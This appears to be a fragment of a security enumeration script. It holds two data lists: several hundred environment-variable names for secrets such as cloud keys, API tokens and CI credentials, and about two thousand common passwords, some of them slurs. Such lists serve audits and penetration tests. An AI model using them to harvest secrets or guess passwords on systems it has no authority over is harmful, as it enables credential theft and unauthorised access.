pwd_in_variables="Dgpg.passphrase|Dsonar.login|Dsonar.projectKey|GITHUB_TOKEN|HB_CODESIGN_GPG_PASS|HB_CODESIGN_KEY_PASS|PUSHOVER_TOKEN|PUSHOVER_USER|VIRUSTOTAL_APIKEY|ACCESSKEY|ACCESSKEYID|ACCESS_KEY|ACCESS_KEY_ID|ACCESS_KEY_SECRET|ACCESS_SECRET|ACCESS_TOKEN|ACCOUNT_SID|ADMIN_EMAIL|ADZERK_API_KEY|ALGOLIA_ADMIN_KEY_1|ALGOLIA_ADMIN_KEY_2|ALGOLIA_ADMIN_KEY_MCM|ALGOLIA_API_KEY|ALGOLIA_API_KEY_MCM|ALGOLIA_API_KEY_SEARCH|ALGOLIA_APPLICATION_ID|ALGOLIA_APPLICATION_ID_1|ALGOLIA_APPLICATION_ID_2|ALGOLIA_APPLICATION_ID_MCM|ALGOLIA_APP_ID|ALGOLIA_APP_ID_MCM|ALGOLIA_SEARCH_API_KEY|ALGOLIA_SEARCH_KEY|ALGOLIA_SEARCH_KEY_1|ALIAS_NAME|ALIAS_PASS|ALICLOUD_ACCESS_KEY|ALICLOUD_SECRET_KEY|amazon_bucket_name|AMAZON_SECRET_ACCESS_KEY|ANDROID_DOCS_DEPLOY_TOKEN|android_sdk_license|android_sdk_preview_license|aos_key|aos_sec|APIARY_API_KEY|APIGW_ACCESS_TOKEN|API_KEY|API_KEY_MCM|API_KEY_SECRET|API_KEY_SID|API_SECRET|appClientSecret|APP_BUCKET_PERM|APP_NAME|APP_REPORT_TOKEN_KEY|APP_TOKEN|ARGOS_TOKEN|ARTIFACTORY_KEY|ARTIFACTS_AWS_ACCESS_KEY_ID|ARTIFACTS_AWS_SECRET_ACCESS_KEY|ARTIFACTS_BUCKET|ARTIFACTS_KEY|ARTIFACTS_SECRET|ASSISTANT_IAM_APIKEY|AURORA_STRING_URL|AUTH0_API_CLIENTID|AUTH0_API_CLIENTSECRET|AUTH0_AUDIENCE|AUTH0_CALLBACK_URL|AUTH0_CLIENT_ID|AUTH0_CLIENT_SECRET|AUTH0_CONNECTION|AUTH0_DOMAIN|AUTHOR_EMAIL_ADDR|AUTHOR_NPM_API_KEY|AUTH_TOKEN|AWS-ACCT-ID|AWS-KEY|AWS-SECRETS|AWS.config.accessKeyId|AWS.config.secretAccessKey|AWSACCESSKEYID|AWSCN_ACCESS_KEY_ID|AWSCN_SECRET_ACCESS_KEY|AWSSECRETKEY|AWS_ACCESS|AWS_ACCESS_KEY|AWS_ACCESS_KEY_ID|AWS_CF_DIST_ID|AWS_DEFAULT|AWS_DEFAULT_REGION|AWS_S3_BUCKET|AWS_SECRET|AWS_SECRET_ACCESS_KEY|AWS_SECRET_KEY|AWS_SES_ACCESS_KEY_ID|AWS_SES_SECRET_ACCESS_KEY|B2_ACCT_ID|B2_APP_KEY|B2_BUCKET|baseUrlTravis|bintrayKey|bintrayUser|BINTRAY_APIKEY|BINTRAY_API_KEY|BINTRAY_KEY|BINTRAY_TOKEN|BINTRAY_USER|BLUEMIX_ACCOUNT|BLUEMIX_API_KEY|BLUEMIX_AUTH|BLUEMIX_NAMESPACE|BLUEMIX_ORG|BLUEMIX_ORGANIZATION|BLUEMIX_PASS|BLUEMIX_PASS_PROD|BLUEMIX_SPACE|BLUEMIX_USER|BRACKETS_REPO_OAUTH_TOKEN|BROWSERSTACK_ACCESS_KEY|BROWSERSTACK_PROJECT_NAME|BROWSER_STACK_ACCESS_KEY|BUCKETEER_AWS_ACCESS_KEY_ID|BUCKETEER_AWS_SECRET_ACCESS_KEY|BUCKETEER_BUCKET_NAME|BUILT_BRANCH_DEPLOY_KEY|BUNDLESIZE_GITHUB_TOKEN|CACHE_S3_SECRET_KEY|CACHE_URL|CARGO_TOKEN|CATTLE_ACCESS_KEY|CATTLE_AGENT_INSTANCE_AUTH|CATTLE_SECRET_KEY|CC_TEST_REPORTER_ID|CC_TEST_REPOTER_ID|CENSYS_SECRET|CENSYS_UID|CERTIFICATE_OSX_P12|CF_ORGANIZATION|CF_PROXY_HOST|channelId|CHEVERNY_TOKEN|CHROME_CLIENT_ID|CHROME_CLIENT_SECRET|CHROME_EXTENSION_ID|CHROME_REFRESH_TOKEN|CI_DEPLOY_USER|CI_NAME|CI_PROJECT_NAMESPACE|CI_PROJECT_URL|CI_REGISTRY_USER|CI_SERVER_NAME|CI_USER_TOKEN|CLAIMR_DATABASE|CLAIMR_DB|CLAIMR_SUPERUSER|CLAIMR_TOKEN|CLIENT_ID|CLIENT_SECRET|CLI_E2E_CMA_TOKEN|CLI_E2E_ORG_ID|CLOUDAMQP_URL|CLOUDANT_APPLIANCE_DATABASE|CLOUDANT_ARCHIVED_DATABASE|CLOUDANT_AUDITED_DATABASE|CLOUDANT_DATABASE|CLOUDANT_ORDER_DATABASE|CLOUDANT_PARSED_DATABASE|CLOUDANT_PROCESSED_DATABASE|CLOUDANT_SERVICE_DATABASE|CLOUDFLARE_API_KEY|CLOUDFLARE_AUTH_EMAIL|CLOUDFLARE_AUTH_KEY|CLOUDFLARE_EMAIL|CLOUDFLARE_ZONE_ID|CLOUDINARY_URL|CLOUDINARY_URL_EU|CLOUDINARY_URL_STAGING|CLOUD_API_KEY|CLUSTER_NAME|CLU_REPO_URL|CLU_SSH_PRIVATE_KEY_BASE64|CN_ACCESS_KEY_ID|CN_SECRET_ACCESS_KEY|COCOAPODS_TRUNK_EMAIL|COCOAPODS_TRUNK_TOKEN|CODACY_PROJECT_TOKEN|CODECLIMATE_REPO_TOKEN|CODECOV_TOKEN|coding_token|CONEKTA_APIKEY|CONFIGURATION_PROFILE_SID|CONFIGURATION_PROFILE_SID_P2P|CONFIGURATION_PROFILE_SID_SFU|CONSUMERKEY|CONSUMER_KEY|CONTENTFUL_ACCESS_TOKEN|CONTENTFUL_CMA_TEST_TOKEN|CONTENTFUL_INTEGRATION_MANAGEMENT_TOKEN|CONTENTFUL_INTEGRATION_SOURCE_SPACE|CONTENTFUL_MANAGEMENT_API_ACCESS_TOKEN|CONTENTFUL_MANAGEMENT_API_ACCESS_TOKEN_NEW|CONTENTFUL_ORGANIZATION|CONTENTFUL_PHP_MANAGEMENT_TEST_TOKEN|CONTENTFUL_TEST_ORG_CMA_TOKEN|CONTENTFUL_V2_ACCESS_TOKEN|CONTENTFUL_V2_ORGANIZATION|CONVERSATION_URL|COREAPI_HOST|COS_SECRETS|COVERALLS_API_TOKEN|COVERALLS_REPO_TOKEN|COVERALLS_SERVICE_NAME|COVERALLS_TOKEN|COVERITY_SCAN_NOTIFICATION_EMAIL|COVERITY_SCAN_TOKEN|CYPRESS_RECORD_KEY|DANGER_GITHUB_API_TOKEN|DATABASE_HOST|DATABASE_NAME|DATABASE_PORT|DATABASE_USER|datadog_api_key|datadog_app_key|DB_CONNECTION|DB_DATABASE|DB_HOST|DB_PORT|DB_PW|DB_USER|DDGC_GITHUB_TOKEN|DDG_TEST_EMAIL|DDG_TEST_EMAIL_PW|DEPLOY_DIR|DEPLOY_DIRECTORY|DEPLOY_HOST|DEPLOY_PORT|DEPLOY_SECURE|DEPLOY_TOKEN|DEPLOY_USER|DEST_TOPIC|DHL_SOLDTOACCOUNTID|DH_END_POINT_1|DH_END_POINT_2|DIGITALOCEAN_ACCESS_TOKEN|DIGITALOCEAN_SSH_KEY_BODY|DIGITALOCEAN_SSH_KEY_IDS|DOCKER_EMAIL|DOCKER_KEY|DOCKER_PASSDOCKER_POSTGRES_URL|DOCKER_RABBITMQ_HOST|docker_repo|DOCKER_TOKEN|DOCKER_USER|DOORDASH_AUTH_TOKEN|DROPBOX_OAUTH_BEARER|ELASTICSEARCH_HOST|ELASTIC_CLOUD_AUTH|env.GITHUB_OAUTH_TOKEN|env.HEROKU_API_KEY|ENV_KEY|ENV_SECRET|ENV_SECRET_ACCESS_KEY|eureka.awsAccessId|eureka.awsSecretKey|ExcludeRestorePackageImports|EXPORT_SPACE_ID|FIREBASE_API_JSON|FIREBASE_API_TOKEN|FIREBASE_KEY|FIREBASE_PROJECT|FIREBASE_PROJECT_DEVELOP|FIREBASE_PROJECT_ID|FIREBASE_SERVICE_ACCOUNT|FIREBASE_TOKEN|FIREFOX_CLIENT|FIREFOX_ISSUER|FIREFOX_SECRET|FLASK_SECRET_KEY|FLICKR_API_KEY|FLICKR_API_SECRET|FOSSA_API_KEY|ftp_host|FTP_LOGIN|FTP_PW|FTP_USER|GCLOUD_BUCKET|GCLOUD_PROJECT|GCLOUD_SERVICE_KEY|GCS_BUCKET|GHB_TOKEN|GHOST_API_KEY|GH_API_KEY|GH_EMAIL|GH_NAME|GH_NEXT_OAUTH_CLIENT_ID|GH_NEXT_OAUTH_CLIENT_SECRET|GH_NEXT_UNSTABLE_OAUTH_CLIENT_ID|GH_NEXT_UNSTABLE_OAUTH_CLIENT_SECRET|GH_OAUTH_CLIENT_ID|GH_OAUTH_CLIENT_SECRET|GH_OAUTH_TOKEN|GH_REPO_TOKEN|GH_TOKEN|GH_UNSTABLE_OAUTH_CLIENT_ID|GH_UNSTABLE_OAUTH_CLIENT_SECRET|GH_USER_EMAIL|GH_USER_NAME|GITHUB_ACCESS_TOKEN|GITHUB_API_KEY|GITHUB_API_TOKEN|GITHUB_AUTH|GITHUB_AUTH_TOKEN|GITHUB_AUTH_USER|GITHUB_CLIENT_ID|GITHUB_CLIENT_SECRET|GITHUB_DEPLOYMENT_TOKEN|GITHUB_DEPLOY_HB_DOC_PASS|GITHUB_HUNTER_TOKEN|GITHUB_KEY|GITHUB_OAUTH|GITHUB_OAUTH_TOKEN|GITHUB_RELEASE_TOKEN|GITHUB_REPO|GITHUB_TOKEN|GITHUB_TOKENS|GITHUB_USER|GITLAB_USER_EMAIL|GITLAB_USER_LOGIN|GIT_AUTHOR_EMAIL|GIT_AUTHOR_NAME|GIT_COMMITTER_EMAIL|GIT_COMMITTER_NAME|GIT_EMAIL|GIT_NAME|GIT_TOKEN|GIT_USER|GOOGLE_CLIENT_EMAIL|GOOGLE_CLIENT_ID|GOOGLE_CLIENT_SECRET|GOOGLE_MAPS_API_KEY|GOOGLE_PRIVATE_KEY|gpg.passphrase|GPG_EMAIL|GPG_ENCRYPTION|GPG_EXECUTABLE|GPG_KEYNAME|GPG_KEY_NAME|GPG_NAME|GPG_OWNERTRUST|GPG_PASSPHRASE|GPG_PRIVATE_KEY|GPG_SECRET_KEYS|gradle.publish.key|gradle.publish.secret|GRADLE_SIGNING_KEY_ID|GREN_GITHUB_TOKEN|GRGIT_USER|HAB_AUTH_TOKEN|HAB_KEY|HB_CODESIGN_GPG_PASS|HB_CODESIGN_KEY_PASS|HEROKU_API_KEY|HEROKU_API_USER|HEROKU_EMAIL|HEROKU_TOKEN|HOCKEYAPP_TOKEN|INTEGRATION_TEST_API_KEY|INTEGRATION_TEST_APPID|INTERNAL-SECRETS|IOS_DOCS_DEPLOY_TOKEN|IRC_NOTIFICATION_CHANNEL|JDBC:MYSQL|jdbc_databaseurl|jdbc_host|jdbc_user|JWT_SECRET|KAFKA_ADMIN_URL|KAFKA_INSTANCE_NAME|KAFKA_REST_URL|KEYSTORE_PASS|KOVAN_PRIVATE_KEY|LEANPLUM_APP_ID|LEANPLUM_KEY|LICENSES_HASH|LICENSES_HASH_TWO|LIGHTHOUSE_API_KEY|LINKEDIN_CLIENT_ID|LINKEDIN_CLIENT_SECRET|LINODE_INSTANCE_ID|LINODE_VOLUME_ID|LINUX_SIGNING_KEY|LL_API_SHORTNAME|LL_PUBLISH_URL|LL_SHARED_KEY|LOOKER_TEST_RUNNER_CLIENT_ID|LOOKER_TEST_RUNNER_CLIENT_SECRET|LOOKER_TEST_RUNNER_ENDPOINT|LOTTIE_HAPPO_API_KEY|LOTTIE_HAPPO_SECRET_KEY|LOTTIE_S3_API_KEY|LOTTIE_S3_SECRET_KEY|mailchimp_api_key|MAILCHIMP_KEY|mailchimp_list_id|mailchimp_user|MAILER_HOST|MAILER_TRANSPORT|MAILER_USER|MAILGUN_APIKEY|MAILGUN_API_KEY|MAILGUN_DOMAIN|MAILGUN_PRIV_KEY|MAILGUN_PUB_APIKEY|MAILGUN_PUB_KEY|MAILGUN_SECRET_API_KEY|MAILGUN_TESTDOMAIN|ManagementAPIAccessToken|MANAGEMENT_TOKEN|MANAGE_KEY|MANAGE_SECRET|MANDRILL_API_KEY|MANIFEST_APP_TOKEN|MANIFEST_APP_URL|MapboxAccessToken|MAPBOX_ACCESS_TOKEN|MAPBOX_API_TOKEN|MAPBOX_AWS_ACCESS_KEY_ID|MAPBOX_AWS_SECRET_ACCESS_KEY|MG_API_KEY|MG_DOMAIN|MG_EMAIL_ADDR|MG_EMAIL_TO|MG_PUBLIC_API_KEY|MG_SPEND_MONEY|MG_URL|MH_APIKEY|MILE_ZERO_KEY|MINIO_ACCESS_KEY|MINIO_SECRET_KEY|MYSQLMASTERUSER|MYSQLSECRET|MYSQL_DATABASE|MYSQL_HOSTNAMEMYSQL_USER|MY_SECRET_ENV|NETLIFY_API_KEY|NETLIFY_SITE_ID|NEW_RELIC_BETA_TOKEN|NGROK_AUTH_TOKEN|NGROK_TOKEN|node_pre_gyp_accessKeyId|NODE_PRE_GYP_GITHUB_TOKEN|node_pre_gyp_secretAccessKey|NPM_API_KEY|NPM_API_TOKEN|NPM_AUTH_TOKEN|NPM_EMAIL|NPM_SECRET_KEY|NPM_TOKEN|NUGET_APIKEY|NUGET_API_KEY|NUGET_KEY|NUMBERS_SERVICE|NUMBERS_SERVICE_PASS|NUMBERS_SERVICE_USER|OAUTH_TOKEN|OBJECT_STORAGE_PROJECT_ID|OBJECT_STORAGE_USER_ID|OBJECT_STORE_BUCKET|OBJECT_STORE_CREDS|OCTEST_SERVER_BASE_URL|OCTEST_SERVER_BASE_URL_2|OC_PASS|OFTA_KEY|OFTA_SECRET|OKTA_CLIENT_TOKEN|OKTA_DOMAIN|OKTA_OAUTH2_CLIENTID|OKTA_OAUTH2_CLIENTSECRET|OKTA_OAUTH2_CLIENT_ID|OKTA_OAUTH2_CLIENT_SECRET|OKTA_OAUTH2_ISSUER|OMISE_KEY|OMISE_PKEY|OMISE_PUBKEY|OMISE_SKEY|ONESIGNAL_API_KEY|ONESIGNAL_USER_AUTH_KEY|OPENWHISK_KEY|OPEN_WHISK_KEY|OSSRH_PASS|OSSRH_SECRET|OSSRH_USER|OS_AUTH_URL|OS_PROJECT_NAME|OS_TENANT_ID|OS_TENANT_NAME|PAGERDUTY_APIKEY|PAGERDUTY_ESCALATION_POLICY_ID|PAGERDUTY_FROM_USER|PAGERDUTY_PRIORITY_ID|PAGERDUTY_SERVICE_ID|PANTHEON_SITE|PARSE_APP_ID|PARSE_JS_KEY|PAYPAL_CLIENT_ID|PAYPAL_CLIENT_SECRET|PERCY_TOKEN|PERSONAL_KEY|PERSONAL_SECRET|PG_DATABASE|PG_HOST|PLACES_APIKEY|PLACES_API_KEY|PLACES_APPID|PLACES_APPLICATION_ID|PLOTLY_APIKEY|POSTGRESQL_DB|POSTGRESQL_PASS|POSTGRES_ENV_POSTGRES_DB|POSTGRES_ENV_POSTGRES_USER|POSTGRES_PORT|PREBUILD_AUTH|PROD.ACCESS.KEY.ID|PROD.SECRET.KEY|PROD_BASE_URL_RUNSCOPE|PROJECT_CONFIG|PUBLISH_KEY|PUBLISH_SECRET|PUSHOVER_TOKEN|PUSHOVER_USER|PYPI_PASSOWRD|QUIP_TOKEN|RABBITMQ_SERVER_ADDR|REDISCLOUD_URL|REDIS_STUNNEL_URLS|REFRESH_TOKEN|RELEASE_GH_TOKEN|RELEASE_TOKEN|remoteUserToShareTravis|REPORTING_WEBDAV_URL|REPORTING_WEBDAV_USER|repoToken|REST_API_KEY|RINKEBY_PRIVATE_KEY|ROPSTEN_PRIVATE_KEY|route53_access_key_id|RTD_KEY_PASS|RTD_STORE_PASS|RUBYGEMS_AUTH_TOKEN|s3_access_key|S3_ACCESS_KEY_ID|S3_BUCKET_NAME_APP_LOGS|S3_BUCKET_NAME_ASSETS|S3_KEY|S3_KEY_APP_LOGS|S3_KEY_ASSETS|S3_PHOTO_BUCKET|S3_SECRET_APP_LOGS|S3_SECRET_ASSETS|S3_SECRET_KEY|S3_USER_ID|S3_USER_SECRET|SACLOUD_ACCESS_TOKEN|SACLOUD_ACCESS_TOKEN_SECRET|SACLOUD_API|SALESFORCE_BULK_TEST_SECURITY_TOKEN|SANDBOX_ACCESS_TOKEN|SANDBOX_AWS_ACCESS_KEY_ID|SANDBOX_AWS_SECRET_ACCESS_KEY|SANDBOX_LOCATION_ID|SAUCE_ACCESS_KEY|SECRETACCESSKEY|SECRETKEY|SECRET_0|SECRET_10|SECRET_11|SECRET_1|SECRET_2|SECRET_3|SECRET_4|SECRET_5|SECRET_6|SECRET_7|SECRET_8|SECRET_9|SECRET_KEY_BASE|SEGMENT_API_KEY|SELION_SELENIUM_SAUCELAB_GRID_CONFIG_FILE|SELION_SELENIUM_USE_SAUCELAB_GRID|SENDGRID|SENDGRID_API_KEY|SENDGRID_FROM_ADDRESS|SENDGRID_KEY|SENDGRID_USER|SENDWITHUS_KEY|SENTRY_AUTH_TOKEN|SERVICE_ACCOUNT_SECRET|SES_ACCESS_KEY|SES_SECRET_KEY|setDstAccessKey|setDstSecretKey|setSecretKey|SIGNING_KEY|SIGNING_KEY_SECRET|SIGNING_KEY_SID|SNOOWRAP_CLIENT_SECRET|SNOOWRAP_REDIRECT_URI|SNOOWRAP_REFRESH_TOKEN|SNOOWRAP_USER_AGENT|SNYK_API_TOKEN|SNYK_ORG_ID|SNYK_TOKEN|SOCRATA_APP_TOKEN|SOCRATA_USER|SONAR_ORGANIZATION_KEY|SONAR_PROJECT_KEY|SONAR_TOKEN|SONATYPE_GPG_KEY_NAME|SONATYPE_GPG_PASSPHRASE|SONATYPE_PASSSONATYPE_TOKEN_USER|SONATYPE_USER|SOUNDCLOUD_CLIENT_ID|SOUNDCLOUD_CLIENT_SECRET|SPACES_ACCESS_KEY_ID|SPACES_SECRET_ACCESS_KEY|SPA_CLIENT_ID|SPOTIFY_API_ACCESS_TOKEN|SPOTIFY_API_CLIENT_ID|SPOTIFY_API_CLIENT_SECRET|sqsAccessKey|sqsSecretKey|SRCCLR_API_TOKEN|SSHPASS|SSMTP_CONFIG|STARSHIP_ACCOUNT_SID|STARSHIP_AUTH_TOKEN|STAR_TEST_AWS_ACCESS_KEY_ID|STAR_TEST_BUCKET|STAR_TEST_LOCATION|STAR_TEST_SECRET_ACCESS_KEY|STORMPATH_API_KEY_ID|STORMPATH_API_KEY_SECRET|STRIPE_PRIVATE|STRIPE_PUBLIC|STRIP_PUBLISHABLE_KEY|STRIP_SECRET_KEY|SURGE_LOGIN|SURGE_TOKEN|SVN_PASS|SVN_USER|TESCO_API_KEY|THERA_OSS_ACCESS_ID|THERA_OSS_ACCESS_KEY|TRAVIS_ACCESS_TOKEN|TRAVIS_API_TOKEN|TRAVIS_COM_TOKEN|TRAVIS_E2E_TOKEN|TRAVIS_GH_TOKEN|TRAVIS_PULL_REQUEST|TRAVIS_SECURE_ENV_VARS|TRAVIS_TOKEN|TREX_CLIENT_ORGURL|TREX_CLIENT_TOKEN|TREX_OKTA_CLIENT_ORGURL|TREX_OKTA_CLIENT_TOKEN|TWILIO_ACCOUNT_ID|TWILIO_ACCOUNT_SID|TWILIO_API_KEY|TWILIO_API_SECRET|TWILIO_CHAT_ACCOUNT_API_SERVICE|TWILIO_CONFIGURATION_SID|TWILIO_SID|TWILIO_TOKEN|TWITTEROAUTHACCESSSECRET|TWITTEROAUTHACCESSTOKEN|TWITTER_CONSUMER_KEY|TWITTER_CONSUMER_SECRET|UNITY_SERIAL|URBAN_KEY|URBAN_MASTER_SECRET|URBAN_SECRET|userTravis|USER_ASSETS_ACCESS_KEY_ID|USER_ASSETS_SECRET_ACCESS_KEY|VAULT_APPROLE_SECRET_ID|VAULT_PATH|VIP_GITHUB_BUILD_REPO_DEPLOY_KEY|VIP_GITHUB_DEPLOY_KEY|VIP_GITHUB_DEPLOY_KEY_PASS|VIRUSTOTAL_APIKEY|VISUAL_RECOGNITION_API_KEY|V_SFDC_CLIENT_ID|V_SFDC_CLIENT_SECRET|WAKATIME_API_KEY|WAKATIME_PROJECT|WATSON_CLIENT|WATSON_CONVERSATION_WORKSPACE|WATSON_DEVICE|WATSON_DEVICE_TOPIC|WATSON_TEAM_ID|WATSON_TOPIC|WIDGET_BASIC_USER_2|WIDGET_BASIC_USER_3|WIDGET_BASIC_USER_4|WIDGET_BASIC_USER_5|WIDGET_FB_USER|WIDGET_FB_USER_2|WIDGET_FB_USER_3|WIDGET_TEST_SERVERWORDPRESS_DB_USER|WORKSPACE_ID|WPJM_PHPUNIT_GOOGLE_GEOCODE_API_KEY|WPT_DB_HOST|WPT_DB_NAME|WPT_DB_USER|WPT_PREPARE_DIR|WPT_REPORT_API_KEY|WPT_SSH_CONNECT|WPT_SSH_PRIVATE_KEY_BASE64|YANGSHUN_GH_TOKEN|YT_ACCOUNT_CHANNEL_ID|YT_ACCOUNT_CLIENT_ID|YT_ACCOUNT_CLIENT_SECRET|YT_ACCOUNT_REFRESH_TOKEN|YT_API_KEY|YT_CLIENT_ID|YT_CLIENT_SECRET|YT_PARTNER_CHANNEL_ID|YT_PARTNER_CLIENT_ID|YT_PARTNER_CLIENT_SECRET|YT_PARTNER_ID|YT_PARTNER_REFRESH_TOKEN|YT_SERVER_API_KEY|ZHULIANG_GH_TOKEN|ZOPIM_ACCOUNT_KEY"

top2000pwds="123456 password 123456789 12345678 12345 qwerty 123123 111111 abc123 1234567 dragon 1q2w3e4r sunshine 654321 master 1234 football 1234567890 000000 computer 666666 superman michael internet iloveyou daniel 1qaz2wsx monkey shadow jessica letmein baseball whatever princess abcd1234 123321 starwars 121212 thomas zxcvbnm trustno1 killer welcome jordan aaaaaa 123qwe freedom password1 charlie batman jennifer 7777777 michelle diamond oliver mercedes benjamin 11111111 snoopy samantha victoria matrix george alexander secret cookie asdfgh 987654321 123abc orange fuckyou asdf1234 pepper hunter silver joshua banana 1q2w3e chelsea 1234qwer summer qwertyuiop phoenix andrew q1w2e3r4 elephant rainbow mustang merlin london garfield robert chocolate 112233 samsung qazwsx matthew buster jonathan ginger flower 555555 test caroline amanda maverick midnight martin junior 88888888 anthony jasmine creative patrick mickey 123 qwerty123 cocacola chicken passw0rd forever william nicole hello yellow nirvana justin friends cheese tigger mother liverpool blink182 asdfghjkl andrea spider scooter richard soccer rachel purple morgan melissa jackson arsenal 222222 qwe123 gabriel ferrari jasper danielle bandit angela scorpion prince maggie austin veronica nicholas monster dexter carlos thunder success hannah ashley 131313 stella brandon pokemon joseph asdfasdf 999999 metallica december chester taylor sophie samuel rabbit crystal barney xxxxxx steven ranger patricia christian asshole spiderman sandra hockey angels security parker heather 888888 victor harley 333333 system slipknot november jordan23 canada tennis qwertyui casper gemini asd123 winter hammer cooper america albert 777777 winner charles butterfly swordfish popcorn penguin dolphin carolina access 987654 hardcore corvette apples 12341234 sabrina remember qwer1234 edward dennis cherry sparky natasha arthur vanessa marina leonardo johnny dallas antonio winston
snickers olivia nothing iceman destiny coffee apollo 696969 windows williams school madison dakota angelina anderson 159753 1111 yamaha trinity rebecca nathan guitar compaq 123123123 toyota shannon playboy peanut pakistan diablo abcdef maxwell golden asdasd 123654 murphy monica marlboro kimberly gateway bailey 00000000 snowball scooby nikita falcon august test123 sebastian panther love johnson godzilla genesis brandy adidas zxcvbn wizard porsche online hello123 fuckoff eagles champion bubbles boston smokey precious mercury lauren einstein cricket cameron angel admin napoleon mountain lovely friend flowers dolphins david chicago sierra knight yankees wilson warrior simple nelson muffin charlotte calvin spencer newyork florida fernando claudia basketball barcelona 87654321 willow stupid samson police paradise motorola manager jaguar jackie family doctor bullshit brooklyn tigers stephanie slayer peaches miller heaven elizabeth bulldog animal 789456 scorpio rosebud qwerty12 franklin claire american vincent testing pumpkin platinum louise kitten general united turtle marine icecream hacker darkness cristina colorado boomer alexandra steelers serenity please montana mitchell marcus lollipop jessie happy cowboy 102030 marshall jupiter jeremy gibson fucker barbara adrian 1qazxsw2 12344321 11111 startrek fishing digital christine business abcdefg nintendo genius 12qwaszx walker q1w2e3 player legend carmen booboo tomcat ronaldo people pamela marvin jackass google fender asdfghjk Password 1q2w3e4r5t zaq12wsx scotland phantom hercules fluffy explorer alexis walter trouble tester qwerty1 melanie manchester gordon firebird engineer azerty 147258 virginia tiger simpsons passion lakers james angelica 55555 vampire tiffany september private maximus loveme isabelle isabella eclipse dreamer changeme cassie badboy 123456a stanley sniper rocket passport pandora justice infinity cookies barbie xavier unicorn superstar
stephen rangers orlando money domino courtney viking tucker travis scarface pavilion nicolas natalie gandalf freddy donald captain abcdefgh a1b2c3d4 speedy peter nissan loveyou harrison friday francis dancer 159357 101010 spitfire saturn nemesis little dreams catherine brother birthday 1111111 wolverine victory student france fantasy enigma copper bonnie teresa mexico guinness georgia california sweety logitech julian hotdog emmanuel butter beatles 11223344 tristan sydney spirit october mozart lolita ireland goldfish eminem douglas cowboys control cheyenne alex testtest stargate raiders microsoft diesel debbie danger chance asdf anything aaaaaaaa welcome1 qwert hahaha forest eternity disney denise carter alaska zzzzzz titanic shorty shelby pookie pantera england chris zachary westside tamara password123 pass maryjane lincoln willie teacher pierre michael1 leslie lawrence kristina kawasaki drowssap college blahblah babygirl avatar alicia regina qqqqqq poohbear miranda madonna florence sapphire norman hamilton greenday galaxy frankie black awesome suzuki spring qazwsxedc magnum lovers liberty gregory 232323 twilight timothy swimming super stardust sophia sharon robbie predator penelope michigan margaret jesus hawaii green brittany brenda badger a1b2c3 444444 winnie wesley voodoo skippy shithead redskins qwertyu pussycat houston horses gunner fireball donkey cherokee australia arizona 1234abcd skyline power perfect lovelove kermit kenneth katrina eugene christ thailand support special runner lasvegas jason fuckme butthead blizzard athena abigail 8675309 violet tweety spanky shamrock red123 rascal melody joanna hello1 driver bluebird biteme atlantis arnold apple alison taurus random pirate monitor maria lizard kevin hummer holland buffalo 147258369 007007 valentine roberto potter magnolia juventus indigo indian harvey duncan diamonds daniela christopher bradley bananas warcraft sunset simone renegade
redsox philip monday mohammed indiana energy bond007 avalon terminator skipper shopping scotty savannah raymond morris mnbvcxz michele lucky lucifer kingdom karina giovanni cynthia a123456 147852 12121212 wildcats ronald portugal mike helpme froggy dragons cancer bullet beautiful alabama 212121 unknown sunflower sports siemens santiago kathleen hotmail hamster golfer future father enterprise clifford christina camille camaro beauty 55555555 vision tornado something rosemary qweasd patches magic helena denver cracker beaver basket atlanta vacation smiles ricardo pascal newton jeffrey jasmin january honey hollywood holiday gloria element chandler booger angelo allison action 99999999 target snowman miguel marley lorraine howard harmony children celtic beatrice airborne wicked voyager valentin thx1138 thumper samurai moonlight mmmmmm karate kamikaze jamaica emerald bubble brooke zombie strawberry spooky software simpson service sarah racing qazxsw philips oscar minnie lalala ironman goddess extreme empire elaine drummer classic carrie berlin asdfg 22222222 valerie tintin therock sunday skywalker salvador pegasus panthers packers network mission mark legolas lacrosse kitty kelly jester italia hiphop freeman charlie1 cardinal bluemoon bbbbbb bastard alyssa 0123456789 zeppelin tinker surfer smile rockstar operator naruto freddie dragonfly dickhead connor anaconda amsterdam alfred a12345 789456123 77777777 trooper skittles shalom raptor pioneer personal ncc1701 nascar music kristen kingkong global geronimo germany country christmas bernard benson wrestling warren techno sunrise stefan sister savage russell robinson oracle millie maddog lightning kingston kennedy hannibal garcia download dollar darkstar brutus bobby autumn webster vanilla undertaker tinkerbell sweetpea ssssss softball rafael panasonic pa55word keyboard isabel hector fisher dominic darkside cleopatra blue assassin amelia vladimir roland
nigger national monique molly matthew1 godfather frank curtis change central cartman brothers boogie archie warriors universe turkey topgun solomon sherry sakura rush2112 qwaszx office mushroom monika marion lorenzo john herman connect chopper burton blondie bitch bigdaddy amber 456789 1a2b3c4d ultimate tequila tanner sweetie scott rocky popeye peterpan packard loverboy leonard jimmy harry griffin design buddha 1 wallace truelove trombone toronto tarzan shirley sammy pebbles natalia marcel malcolm madeline jerome gilbert gangster dingdong catalina buddy blazer billy bianca alejandro 54321 252525 111222 0000 water sucker rooster potato norton lucky1 loving lol123 ladybug kittycat fuck forget flipper fireman digger bonjour baxter audrey aquarius 1111111111 pppppp planet pencil patriots oxford million martha lindsay laura jamesbond ihateyou goober giants garden diana cecilia brazil blessing bishop bigdog airplane Password1 tomtom stingray psycho pickle outlaw number1 mylove maurice madman maddie lester hendrix hellfire happy1 guardian flamingo enter chichi 0987654321 western twister trumpet trixie socrates singer sergio sandman richmond piglet pass123 osiris monkey1 martina justine english electric church castle caesar birdie aurora artist amadeus alberto 246810 whitney thankyou sterling star ronnie pussy printer picasso munchkin morpheus madmax kaiser julius imperial happiness goodluck counter columbia campbell blessed blackjack alpha 999999999 142536 wombat wildcat trevor telephone smiley saints pretty oblivion newcastle mariana janice israel imagine freedom1 detroit deedee darren catfish adriana washington warlock valentina valencia thebest spectrum skater sheila shaggy poiuyt member jessica1 jeremiah jack insane iloveu handsome goldberg gabriela elijah damien daisy buttons blabla bigboy apache anthony1 a1234567 xxxxxxxx toshiba tommy sailor peekaboo motherfucker montreal manuel madrid kramer
katherine kangaroo jenny immortal harris hamlet gracie fucking firefly chocolat bentley account 321321 2222 1a2b3c thompson theman strike stacey science running research polaris oklahoma mariposa marie leader julia island idontknow hitman german felipe fatcat fatboy defender applepie annette 010203 watson travel sublime stewart steve squirrel simon sexy pineapple phoebe paris panzer nadine master1 mario kelsey joker hongkong gorilla dinosaur connie bowling bambam babydoll aragorn andreas 456123 151515 wolves wolfgang turner semperfi reaper patience marilyn fletcher drpepper dorothy creation brian bluesky andre yankee wordpass sweet spunky sidney serena preston pauline passwort original nightmare miriam martinez labrador kristin kissme henry gerald garrett 